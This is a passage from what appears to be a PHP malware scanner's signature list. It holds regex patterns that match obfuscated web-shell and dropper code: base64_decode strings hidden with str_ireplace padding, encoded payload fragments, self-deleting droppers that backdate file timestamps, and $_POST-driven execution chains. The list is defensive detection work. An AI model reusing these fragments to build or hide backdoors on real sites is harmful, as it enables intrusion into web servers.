      'pattern' => '/\\<\\?php \\$wuemxs\\=str_ireplace\\("x","","xxxbxxxxxaxxsxxxxxexxx6xxxxx4xxxx_xxxxxdxxxxxexxxxxcxxoxxdxxexx"\\); \\$gvzegvyzgv\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    441 => 
    array (
      'pattern' => '/\\<\\?php \\$ztvrqa\\=str_ireplace\\("p","","pppbppappspppppeppp6ppp4pppp_pppdpppeppppcpppppopppdppppep"\\); \\$gudvrvz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
      'label' => 'source-file tail snippet',
    ),
    442 => 
    array (
      'pattern' => '/\\<\\?php \\$tqkuntpu\\=str_ireplace\\("g","","gggbggggaggsggggeggg6gggg4gggggg_ggggdgggggegggggcggogggggdgggggeggg"\\); \\$vkmmuybf\\="DQoJCUBlcnJvcl9yZXBv/',
      'label' => 'source-file tail snippet',
    ),
    443 => 
    array (
      'pattern' => '/\\<\\?php \\$gbxayq\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$wusndy\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
      'label' => 'source-file tail snippet',
    ),
    444 => 
    array (
      'pattern' => '/\\<\\?php \\$gyygbr\\=str_ireplace\\("v","","vbvvvvavvvvvsvvvvvevvv6vvv4vvv_vvvvvdvvvvevvvvcvvvovvvvvdvvev"\\); \\$skkhhr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    445 => 
    array (
      'pattern' => '/\\<\\?php \\$dwburuwvzp\\=str_ireplace\\("z","","zzzbzzazzzzzszzzzzezzzzz6zzz4zzz_zzdzzzezzzczzzzozzzzzdzzzezzz"\\); \\$ervqnkdg\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    446 => 
    array (
      'pattern' => '/Lyp4a21xd2Z3YWMqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypx/',
      'label' => 'sample-specific encoded fragment',
    ),
    447 => 
    array (
      'pattern' => '/\\<\\?php echo "PXBDZPmCfS"; if \\(file_exists\\("\\.\\/order2\\-dba\\.php"\\)\\)\\{ touch\\("\\.\\/order2\\-dba\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*eVvnm/',
      'label' => 'source-file tail snippet',
    ),
    448 => 
    array (
      'pattern' => '/Lyp4Y2NkdmtyZ2twZHIqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
      'label' => 'sample-specific encoded fragment',
    ),
    449 => 
    array (
      'pattern' => '/\\<\\?php \\$uwwhghrsz\\=str_ireplace\\("g","","gggbgggggagggggsggggegggggg6gggg4gggg_ggggdggggeggggcggoggggggdggggeg"\\); \\$xatuvvdst\\="DQoJCUBlcnJvcl9yZ/',
      'label' => 'source-file tail snippet',
    ),
    450 => 
    array (
      'pattern' => '/LypkZ3ZwdGJrZnVwemdrKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
      'label' => 'sample-specific encoded fragment',
    ),
    451 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}define\\(\'PATH\', __DIR__\\)             ;/s',
      'label' => 'source-file head-tail anchor',
    ),
    452 => 
    array (
      'pattern' => '/\\<\\?php \\$egaxu\\=str_ireplace\\("h","","hbhhhhhahhshhhhhhehhhhh6hhh4hhhh_hhhhhhdhhhhehhhhhchhohhhhhdhhhehhh"\\); \\$hbkfzxkpgz\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    453 => 
    array (
      'pattern' => '/LypoY21ocGNobmh5dmFrcG0qLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
      'label' => 'sample-specific encoded fragment',
    ),
    454 => 
    array (
      'pattern' => '/\\<\\?php \\$wbsfew\\=str_ireplace\\("f","","fffbfffaffffsffefffff6fffff4ffff_fffffdffeffffffcffoffffdfffffefff"\\); \\$hydxnwv\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    455 => 
    array (
      'pattern' => '/\\<\\?php \\$apqcgmb\\=str_ireplace\\("p","","pbpppappsppppepppp6pppp4ppp_ppppppdppepppcpppppopppppdppppep"\\); \\$grrwsvcg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
      'label' => 'source-file tail snippet',
    ),
    456 => 
    array (
      'pattern' => '/\\<\\?php \\$gpefsaezvs\\=str_ireplace\\("k","","kkkbkkkkakkkkskkkkkekkkk6kkkkkk4kkkkk_kkdkkkkkekkkkkckkkkokkkkkkdkkkkkekk"\\); \\$wagxh\\="DQoJCUBlcnJvcl9y/',
      'label' => 'source-file tail snippet',
    ),
    457 => 
    array (
      'pattern' => '/\\<\\?php echo "mTDWHMbQGR"; if \\(file_exists\\("\\.\\/nominate_topic\\.php"\\)\\)\\{ touch\\("\\.\\/nominate_topic\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\);/',
      'label' => 'source-file tail snippet',
    ),
    458 => 
    array (
      'pattern' => '/\\<\\?php echo "dRAszwNZEC"; if \\(file_exists\\("\\.\\/404error\\.php"\\)\\)\\{ touch\\("\\.\\/404error\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*g7wTpPURC/',
      'label' => 'source-file tail snippet',
    ),
    459 => 
    array (
      'pattern' => '/LypkdmFtcWNocnEqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypk/',
      'label' => 'sample-specific encoded fragment',
    ),
    460 => 
    array (
      'pattern' => '/\\<\\?php echo "CtFaPEPruE"; if \\(file_exists\\("\\.\\/feed_embed\\.php"\\)\\)\\{ touch\\("\\.\\/feed_embed\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*ZKtVd/',
      'label' => 'source-file tail snippet',
    ),
    461 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\$_POST                          \\[\'r\'\\]                          \\(                  \\$_POST      \\[\'d\'\\]\\(                \'\',      \\$_POST   \\[\'f\'\\] /s',
      'label' => 'source-file head-tail anchor',
    ),
    462 => 
    array (
      'pattern' => '/\\<\\?php \\$nspbkc\\=str_ireplace\\("i","","ibiiiiiiaiiisiiiieiiii6iiiii4iiii_iiiiiidiiiieiiiciiioiiiidiiiei"\\); \\$arrzfuk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    463 => 
    array (
      'pattern' => '/\\<\\?php echo "yGSTbWqRHF"; if \\(file_exists\\("\\.\\/security\\.php"\\)\\)\\{ touch\\("\\.\\/security\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*T8AEwrB0g/',
      'label' => 'source-file tail snippet',
    ),
    464 => 
    array (
      'pattern' => '/\\<\\?php \\$sdzhvncxx\\=str_ireplace\\("u","","ubuuuuauuuusuuuuueuuuu6uuuu4uuuuu_uuuduuuueuuuucuuuuuuouuuduuuueuu"\\); \\$gzvqbcehyp\\="DQoJCUBlcnJvcl9yZXB/',
      'label' => 'source-file tail snippet',
    ),
    465 => 
    array (
      'pattern' => '/\\)


; 
\\}
set_exception_handler                   \\([\\s\\S]{0,160}\\]                           \\(\\$_POST            \\[/',
      'label' => 'sample-specific literal chain',
    ),
    466 => 
    array (
      'pattern' => '/\\<\\?php \\$vktnhr\\=str_ireplace\\("y","","ybyyyyayysyyyyeyyy6yyy4yyyyy_yyyyyydyyyyeyyyyycyyyoyydyyyyey"\\); \\$uxsaqmbxg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
      'label' => 'source-file tail snippet',
    ),
    467 => 
    array (
      'pattern' => '/\\<\\?php \\$rguakmw\\=str_ireplace\\("h","","hhhbhhhhahhhshhhehhh6hhhh4hhh_hhhdhhhhehhhhchhhhhohhhhdhhhhheh"\\); \\$skyhygdhh\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    468 => 
    array (
      'pattern' => '/\\<\\?php echo "erVDuMxpGN"; if \\(file_exists\\("\\.\\/cat_search\\.php"\\)\\)\\{ touch\\("\\.\\/cat_search\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*MWwYA/',
      'label' => 'source-file tail snippet',
    ),
    469 => 
    array (
      'pattern' => '/\\<\\?php echo "tNTBDmWSND"; if \\(file_exists\\("\\.\\/loading\\.php"\\)\\)\\{ touch\\("\\.\\/loading\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*uefR7H687rS/',
      'label' => 'source-file tail snippet',
    ),
    470 => 
    array (
      'pattern' => '/\\<\\?php \\$gudppgw\\=str_ireplace\\("x","","xbxxxxxaxxxsxxexxx6xxx4xxxxx_xxxdxxxxexxxxxcxxxoxxxxdxxxexxx"\\); \\$qrbqrgym\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
      'label' => 'source-file tail snippet',
    ),
    471 => 
    array (
      'pattern' => '/\\<\\?php \\$msphsbrxn\\=str_ireplace\\("u","","ubuuuuauuuusuuuuueuuuu6uuuu4uuuuu_uuuduuuueuuuucuuuuuuouuuduuuueuu"\\); \\$hvrekkqhf\\="DQoJCUBlcnJvcl9yZXBv/',
      'label' => 'source-file tail snippet',
    ),
    472 => 
    array (
      'pattern' => '/\\<\\?php \\$ngdzfqvp\\=str_ireplace\\("r","","rbrrrrarrrrsrrrrerrrrrr6rrrrrr4rrrrr_rrrrdrrrrrerrrrrrcrrrrrorrrrrrdrrrrerr"\\); \\$rkaedcm\\="DQoJCUBlcnJvcl/',
      'label' => 'source-file tail snippet',
    ),
    473 => 
    array (
      'pattern' => '/\\<\\?php \\$uszmnemhw\\=str_ireplace\\("i","","ibiiaiisiiiieiiiiii6iii4iiii_iidiiiiieiiiciiiioiiiidiiiiiei"\\); \\$kfthbsmuh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    474 => 
    array (
      'pattern' => '/No configuration file found and no installation code available\\. Exiting\\.\\.\\.[\\s\\S]{0,160}No received stream nsw configuration data\\. Exiting\\.\\.\\./',
      'label' => 'sample-specific literal chain',
    ),
    475 => 
    array (
      'pattern' => '/\',\\$errstr\\); array_map\\(\\$cfgwxbpkukcup,array\\([\\s\\S]{0,160}\\)\\); \\} set_error_handler\\(/',
      'label' => 'sample-specific literal chain',
    ),
    476 => 
    array (
      'pattern' => '/\\<\\?php echo "EdHrZHhUuv"; if \\(file_exists\\("\\.\\/config\\.parallel\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.parallel\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__/',
      'label' => 'source-file tail snippet',
    ),
    477 => 
    array (
      'pattern' => '/Lyp0c25idGZkYmVlZWMqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
      'label' => 'sample-specific encoded fragment',
    ),
    478 => 
    array (
      'pattern' => '/\\);\\$vqdqgesxyu\\=\\$vn\\(\\$sguxq\\);user_error\\(\\$vqdqgesxyu,E_USER_ERROR\\);

\\/\\/ Set the root path as a constant\\.
if \\(\\!defined\\(/',
      'label' => 'sample-specific literal',
    ),
    479 => 
    array (
      'pattern' => '/\\<\\?php \\$abfhbk\\=str_ireplace\\("f","","fbffffaffffffsffffeffffff6ff4fffff_ffdffffffefffffcffffoffffdffffef"\\); \\$supcd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    480 => 
    array (
      'pattern' => '/\\<\\?php \\$xgkcsbxs\\=str_ireplace\\("w","","wwwbwwawwwwwswwwwewwww6www4wwww_wwwwdwwwwwewwwwwcwwwwwowwwdwweww"\\); \\$rycpuks\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    481 => 
    array (
      'pattern' => '/\\<\\?php \\$xkdczuwh\\=str_ireplace\\("m","","mbmmmmmammmsmmmmemmmmmm6mmmmmm4mmm_mmmmdmmemmmmmmcmmmommdmmmemmm"\\); \\$fdzdqckf\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    482 => 
    array (
      'pattern' => '/Lyplc3l3cGVjKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkpey8qYmt2/',
      'label' => 'sample-specific encoded fragment',
    ),
    483 => 
    array (
      'pattern' => '/\\<\\?php \\$tqbzry\\=str_ireplace\\("t","","ttbttatttstttttettttt6ttt4tttt_tttttdtttettttctttotttdtttet"\\); \\$wgfhruf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
      'label' => 'source-file tail snippet',
    ),
    484 => 
    array (
      'pattern' => '/\\<\\?php echo "qBfTrbzhhU"; if \\(file_exists\\("\\.\\/message\\.php"\\)\\)\\{ touch\\("\\.\\/message\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*2EwKUbGp5f7/',
      'label' => 'source-file tail snippet',
    ),
    485 => 
    array (
      'pattern' => '/\\<\\?php \\$zvqrtg\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$uxfqmwewwu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
      'label' => 'source-file tail snippet',
    ),
    486 => 
    array (
      'pattern' => '/\\<\\?php \\$unxfbkz\\=str_ireplace\\("x","","xxbxxxaxxxxsxxxexxx6xxxxx4xxx_xxxxxdxxexxcxxxoxxxxxdxxxxxexx"\\); \\$xsrwkt\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    487 => 
    array (
      'pattern' => '/\\<\\?php \\$yhhhrszgqz\\=str_ireplace\\("y","","ybyyyyayysyyyyeyyy6yyy4yyyyy_yyyyyydyyyyeyyyyycyyyoyydyyyyey"\\); \\$xkwdwx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    488 => 
    array (
      'pattern' => '/\\<\\?php \\$marczypp\\=str_ireplace\\("u","","uubuuuauuuusuuuueuu6uuuu4uuuu_uuuduuuueuuuucuuuuouuuuduuueu"\\); \\$gazmdgrcf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    489 => 
    array (
      'pattern' => '/\\<\\?php echo "kudZYyaRKB"; if \\(file_exists\\("\\.\\/preview\\.php"\\)\\)\\{ touch\\("\\.\\/preview\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4ecDGXpfqKN/',
      'label' => 'source-file tail snippet',
    ),
    490 => 
    array (
      'pattern' => '/\\<\\?php \\$unfstzz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$machr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
      'label' => 'source-file tail snippet',
    ),
    491 => 
    array (
      'pattern' => '/\\<\\?php \\$gqcqgtr\\=str_ireplace\\("y","","yyybyyyayyyysyyyyeyyyy6yyyy4yyyy_yydyyyyyyeyyycyyyyoyyyydyyeyy"\\); \\$caaxq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    492 => 
    array (
      'pattern' => '/\\<\\?php \\$xnaynvs\\=str_ireplace\\("f","","ffbfffaffsfffffefff6ffffff4ffff_fffdffffefffffcfffofffffdfffefff"\\); \\$rcbacsmyc\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    493 => 
    array (
      'pattern' => '/LypkcWhyeWNndmRxZWV3bnYqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
      'label' => 'sample-specific encoded fragment',
    ),
    494 => 
    array (
      'pattern' => '/\\<\\?php \\$vwmbwqk\\=str_ireplace\\("n","","nnnbnnnnnannnnsnnnnennnn6nnn4nn_nnnndnnennnncnnnonnnnndnnnnenn"\\); \\$mkmmvcu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    495 => 
    array (
      'pattern' => '/\\$?phpinfo\\b/',
      'label' => 'sample-specific identifier',
    ),
    496 => 
    array (
      'pattern' => '/LypxZHdkc2FiZmR2dXd6ZyovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0p/',
      'label' => 'sample-specific encoded fragment',
    ),
    497 => 
    array (
      'pattern' => '/\\<\\?php \\$yacheqy\\=str_ireplace\\("q","","qqqbqqqqqqaqqqqsqqqqqqeqqqq6qqqq4qqqqq_qqqdqqeqqqcqqqqoqqqqdqqqqqeqqq"\\); \\$cdevs\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    498 => 
    array (
      'pattern' => '/\\<\\?php \\$fwpdvehz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ukryqd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/',
      'label' => 'source-file tail snippet',
    ),
    499 => 
    array (
      'pattern' => '/\\<\\?php echo "sbBfEZCYpy"; if \\(file_exists\\("\\.\\/tcntacc\\.php"\\)\\)\\{ touch\\("\\.\\/tcntacc\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Dx2v0n6S5wQ/',
      'label' => 'source-file tail snippet',
    ),
    500 => 
    array (
      'pattern' => '/\\<\\?php \\$rfacrppx\\=str_ireplace\\("n","","nbnnnnannnnnsnnennn6nnnn4nnnn_nnnndnnnnennnnncnnonnnndnnnnen"\\); \\$ewnmagu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
      'label' => 'source-file tail snippet',
    ),
    501 => 
    array (
      'pattern' => '/\\<\\?php echo "BbYtDFKCVC"; if \\(file_exists\\("\\.\\/user_login\\.php"\\)\\)\\{ touch\\("\\.\\/user_login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*sUhkd/',
      'label' => 'source-file tail snippet',
    ),
    502 => 
    array (
      'pattern' => '/\\<\\?php \\$yntavbd\\=str_ireplace\\("x","","xbxxxxxaxxxsxxexxx6xxx4xxxxx_xxxdxxxxexxxxxcxxxoxxxxdxxxexxx"\\); \\$ttawhe\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    503 => 
    array (
      'pattern' => '/\\<\\?php \\$sdhgys\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$nstsgbvubx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
      'label' => 'source-file tail snippet',
    ),
    504 => 
    array (
      'pattern' => '/\\<\\?php echo "TkZGKxqFRR"; if \\(file_exists\\("\\.\\/page\\-36\\.php"\\)\\)\\{ touch\\("\\.\\/page\\-36\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*B8C8wnEU3fb/',
      'label' => 'source-file tail snippet',
    ),
    505 => 
    array (
      'pattern' => '/\\<\\?php echo "BaVuuVECTe"; if \\(file_exists\\("\\.\\/deptodoc\\.php"\\)\\)\\{ touch\\("\\.\\/deptodoc\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*5uYE73dBu/',
      'label' => 'source-file tail snippet',
    ),
    506 => 
    array (
      'pattern' => '/\\<\\?php echo "GpcXAVbEtV"; if \\(file_exists\\("\\.\\/m5_checkout\\.php"\\)\\)\\{ touch\\("\\.\\/m5_checkout\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*3X4/',
      'label' => 'source-file tail snippet',
    ),
    507 => 
    array (
      'pattern' => '/No configuration file found and no installation code available\\. Exiting\\.\\.\\.[\\s\\S]{0,160}No received stream wbn configuration data\\. Exiting\\.\\.\\./',
      'label' => 'sample-specific literal chain',
    ),
    508 => 
    array (
      'pattern' => '/\\<\\?php \\$yssdv\\=str_ireplace\\("p","","ppbppppappppsppppeppppp6ppppp4ppppp_ppppppdppppppeppppppcppppoppppdppppppep"\\); \\$cywrsusf\\="DQoJCUBlcnJvcl9y/',
      'label' => 'source-file tail snippet',
    ),
    509 => 
    array (
      'pattern' => '/\\<\\?php \\$atkrync\\=str_ireplace\\("f","","fbfffaffffffsfffefffff6ff4ffffff_ffffdfffeffffcffffoffdfffffeff"\\); \\$mechmu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    510 => 
    array (
      'pattern' => '/\\<\\?php \\$bzbfaxzrb\\=str_ireplace\\("r","","rbrrrrrarrrrrrsrrrrerrrr6rrrrr4rrrrrr_rrrrrrdrrrrerrrcrrrrorrrrrrdrrrrer"\\); \\$ygxnztamke\\="DQoJCUBlcnJvc/',
      'label' => 'source-file tail snippet',
    ),
    511 => 
    array (
      'pattern' => '/\\<\\?php \\$sztcs\\=str_ireplace\\("q","","qbqqqqqqaqqsqqqqqqeqqqqq6qqqqqq4qqq_qqqdqqqqeqqcqqqqoqqqqdqqqqeq"\\); \\$twpdsmhbyh\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    512 => 
    array (
      'pattern' => '/\\<\\?php \\$rnafu\\=str_ireplace\\("k","","kkkbkkkkakkkkkskkkkekkkkkk6kkkkk4kk_kkkkdkkkekkkkkckkkkokkkkkkdkkkkekkk"\\); \\$gyyxpsmzkg\\="DQoJCUBlcnJvcl9yZX/',
      'label' => 'source-file tail snippet',
    ),
    513 => 
    array (
      'pattern' => '/\\<\\?php \\$yufcysp\\=str_ireplace\\("m","","mmmbmmammmmsmmemmm6mmmmmm4mmmm_mmmmdmmmmmmemmmmmcmmmommmmdmmmmmmem"\\); \\$enpqahene\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    514 => 
    array (
      'pattern' => '/\\<\\?php \\$xfrckhes\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$mybdag\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/',
      'label' => 'source-file tail snippet',
    ),
    515 => 
    array (
      'pattern' => '/\\<\\?php \\$uwwckvnecz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$qbqdnatetn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJC/',
      'label' => 'source-file tail snippet',
    ),
    516 => 
    array (
      'pattern' => '/\\<\\?php \\$uwqbxpy\\=str_ireplace\\("z","","zzzbzzzazzzzzzszzzzzezzzzzz6zzzzz4zzzz_zzzzdzzzezzzczzzzozzzdzzzzzezz"\\); \\$apsgyfpa\\="DQoJCUBlcnJvcl9yZXBv/',
      'label' => 'source-file tail snippet',
    ),
    517 => 
    array (
      'pattern' => '/\\<\\?php \\$cymvpxt\\=str_ireplace\\("g","","gggbggggaggggsgggggeggggg6gggg4gg_gggggdggggeggggggcggggogggdggeg"\\); \\$ktwwpchwe\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    518 => 
    array (
      'pattern' => '/\\<\\?php \\$ntawv\\=str_ireplace\\("u","","uuubuuuauuusuueuuuuu6uuuu4uuu_uuuuuduueuucuuuuouuuuuduuuuueu"\\); \\$wyebagtu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    519 => 
    array (
      'pattern' => '/\\<\\?php echo "tAsBqFFsRG"; if \\(file_exists\\("\\.\\/publicidad\\.php"\\)\\)\\{ touch\\("\\.\\/publicidad\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*cF6vM/',
      'label' => 'source-file tail snippet',
    ),
    520 => 
    array (
      'pattern' => '/\\<\\?php echo "QrPhvSDwkP"; if \\(file_exists\\("\\.\\/config\\.sum\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.sum\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*h8AbE/',
      'label' => 'source-file tail snippet',
    ),
    521 => 
    array (
      'pattern' => '/\',\\$errstr\\); array_map\\(\\$ggmkxsawurdyqc,array\\([\\s\\S]{0,160}GMT"\\);
\\/\\/header\\(/',
      'label' => 'sample-specific literal chain',
    ),
    522 => 
    array (
      'pattern' => '/\\<\\?php echo "VgHgHbtMcK"; if \\(file_exists\\("\\.\\/pv_de_recette\\.php"\\)\\)\\{ touch\\("\\.\\/pv_de_recette\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\//',
      'label' => 'source-file tail snippet',
    ),
    523 => 
    array (
      'pattern' => '/\\<\\?php \\$fqkzgtt\\=str_ireplace\\("k","","kkkbkkakkkkkskkekk6kkkkk4kk_kkkkkdkkekkkkkckkkkkokkkdkkkkkekk"\\); \\$ryevfgueb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    524 => 
    array (
      'pattern' => '/\\<\\?php \\$nmrwdtvncu\\=str_ireplace\\("u","","uubuuuauuuusuuuueuu6uuuu4uuuu_uuuduuuueuuuucuuuuouuuuduuueu"\\); \\$wugfx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    525 => 
    array (
      'pattern' => '/\\<\\?php \\$ecnsxuthgy\\=str_ireplace\\("p","","pbppppappsppeppppp6ppp4ppp_pppdpppppepppcpppppoppppdpppep"\\); \\$qhrvck\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    526 => 
    array (
      'pattern' => '/\\<\\?php \\$seufa\\=str_ireplace\\("f","","fffbffaffsffffefff6ffff4fff_ffffdffefffffcfffofffffdfffffef"\\); \\$smxptf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQ/',
      'label' => 'source-file tail snippet',
    ),
    527 => 
    array (
      'pattern' => '/\\<\\?php \\$esfnctr\\=str_ireplace\\("x","","xxbxxxaxxxxsxxxexxx6xxxxx4xxx_xxxxxdxxexxcxxxoxxxxxdxxxxxexx"\\); \\$kteyrsepb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    528 => 
    array (
      'pattern' => '/\\<\\?php echo "QWznfDAaxU"; if \\(file_exists\\("\\.\\/cataloguesearch\\.php"\\)\\)\\{ touch\\("\\.\\/cataloguesearch\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__/',
      'label' => 'source-file tail snippet',
    ),
    529 => 
    array (
      'pattern' => '/LyprdXF4c2YqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7LypycHZy/',
      'label' => 'sample-specific encoded fragment',
    ),
    530 => 
    array (
